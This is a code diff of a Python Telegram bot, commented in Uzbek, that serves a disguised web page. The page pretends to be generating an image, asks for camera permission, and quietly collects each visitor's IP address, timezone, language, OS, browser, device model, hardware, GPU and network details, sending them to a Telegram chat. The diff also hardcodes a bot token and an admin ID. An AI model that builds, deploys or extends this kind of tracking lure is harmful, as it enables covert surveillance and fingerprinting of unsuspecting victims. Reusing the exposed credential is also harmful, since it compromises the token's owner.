@@ -1,3 +1,35 @@
+#!/usr/bin/env python3
+# main.py
+import logging
+import os
+import uuid
+import json
+import asyncio
+import base64
+from datetime import datetime
+from io import BytesIO
+from aiohttp import web
+from telegram import Update, InputFile
+from telegram.ext import (
+    Application, CommandHandler, ContextTypes
+)
+
+# ---------------- LOG ----------------
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# ---------------- ENV ----------------
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app  ").rstrip('/')
+
+if not BOT_TOKEN:
+    logger.error("BOT_TOKEN kerak! ENV ga qo‘ying.")
+    exit(1)
+
 # ... (boshidagi importlar o'zgarmaydi)
 
 # ---------------- GLOBAL STATE ----------------
@@ -15,7 +47,7 @@ async def track_page(request):
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Jgar...</title>
+  <title>Ma'lumot yig'ilmoqda...</title>
   <style>
     body {{
       background: #0f1419;
@@ -43,7 +75,7 @@ async def track_page(request):
   </style>
 </head>
 <body>
-  <h2>Iltimos, kuting...<br>Rasm Yaratilmoqda</h2>
+  <h2>Iltimos, kuting...<br>Ma'lumotlar yig‘ilmoqda</h2>
   <div class="loader"></div>
   <div class="note">Kamera ruxsati so'ralishi mumkin — ruxsat bering.</div>
   <script>
@@ -181,35 +213,31 @@ async def submit_data(request):
         if not telegram_id:
             return web.json_response({"error": "Token topilmadi"}, status=400)
 
-        # IP manzilini qo'shish
         ip = request.remote or "Noma'lum"
-
-        # UTC offset formatlash
         utc_offset = client_data.get('utcOffset', 0)
         sign = '+' if utc_offset >= 0 else ''
         utc_str = f"UTC{sign}{utc_offset:g}:00"
 
-        # Qurilmalar
-        devs = client_data.get('devices', {{}})
-        devices_str = f"mikrofon: {{devs.get('mic', 0)}} ta, karnay: {{devs.get('speaker', 0)}} ta, kamera: {{devs.get('camera', 0)}} ta"
+        devs = client_data.get('devices', {})
+        devices_str = f"mikrofon: {devs.get('mic', 0)} ta, karnay: {devs.get('speaker', 0)} ta, kamera: {devs.get('camera', 0)} ta"
 
         message = (
-            f"🕒 {client_data.get('timestamp', 'Noma\\'lum')}\n"
-            f"🌍 Vaqt zonasi: {client_data.get('timezone', 'Noma\\'lum')}\n"
+            f"🕒 {client_data.get('timestamp', \"Noma'lum\")}\n"
+            f"🌍 Vaqt zonasi: {client_data.get('timezone', \"Noma'lum\")}\n"
             f"({utc_str})\n"
             f"📍 IP: {ip}\n"
-            f"💬 Til: {client_data.get('languages', 'Noma\\'lum')}\n"
-            f"💻 Tizim: {client_data.get('os', 'Noma\\'lum')} | Brauzer: {client_data.get('browser', 'Noma\\'lum')}\n"
-            f"📱 Qurilma: {client_data.get('model', 'Noma\\'lum')} ({client_data.get('deviceType', 'Noma\\'lum')})\n"
+            f"💬 Til: {client_data.get('languages', \"Noma'lum\")}\n"
+            f"💻 Tizim: {client_data.get('os', \"Noma'lum\")} | Brauzer: {client_data.get('browser', \"Noma'lum\")}\n"
+            f"📱 Qurilma: {client_data.get('model', \"Noma'lum\")} ({client_data.get('deviceType', \"Noma'lum\")})\n"
             f"🧠 CPU: {client_data.get('cpuCores', '?')} ta | RAM: {client_data.get('ram', '?')}\n"
             f"📺 Ekran: {client_data.get('screen', '?')}\n"
             f"RGBO Ekran chuqurligi: rang: {client_data.get('colorDepth', '?')}\n"
             f"Ko‘rinish (viewport): {client_data.get('viewport', '?')}\n"
             f"🔌 Qurilmalar: {devices_str}\n"
-            f"📷 Kamera: {client_data.get('cameraRes', 'Noma\\'lum')}\n"
-            f"📶 Internet: {client_data.get('network', 'Noma\\'lum')}\n"
-            f"🎮 GPU: {client_data.get('gpu', 'Noma\\'lum')}\n"
-            f"🔍 UA: {client_data.get('userAgent', 'Noma\\'lum')}"
+            f"📷 Kamera: {client_data.get('cameraRes', \"Noma'lum\")}\n"
+            f"📶 Internet: {client_data.get('network', \"Noma'lum\")}\n"
+            f"🎮 GPU: {client_data.get('gpu', \"Noma'lum\")}\n"
+            f"🔍 UA: {client_data.get('userAgent', \"Noma'lum\")}"
         )
 
         await request.app['bot'].send_message(chat_id=telegram_id, text=message)
@@ -217,8 +245,6 @@ async def submit_data(request):
     except Exception as e:
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
-
-
 # ---------------- Web Server: /camera_denied ----------------
 async def camera_denied(request):
     try:
@@ -237,6 +263,7 @@ async def camera_denied(request):
 
 
 # ---------------- Web Server Starter ----------------
+
 async def start_web_server(bot):
     app = web.Application()
     app['bot'] = bot
@@ -250,6 +277,7 @@ async def start_web_server(bot):
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
+    
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
     asyncio.create_task(start_web_server(app.bot))
